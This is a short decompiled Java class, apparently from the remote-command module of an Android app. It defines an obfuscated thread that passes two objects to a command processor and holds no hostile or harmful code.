package com.vvt.remotecommand.a;

class c
  extends Thread
{
  c(b paramb, String paramString)
  {
    super(paramString);
  }
  
  public void run()
  {
    b localb = this.a;
    Object localObject = b.a(this.a);
    com.vvt.remotecommand.processor.c localc = b.b(this.a);
    localb.a(localObject, localc);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/a/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */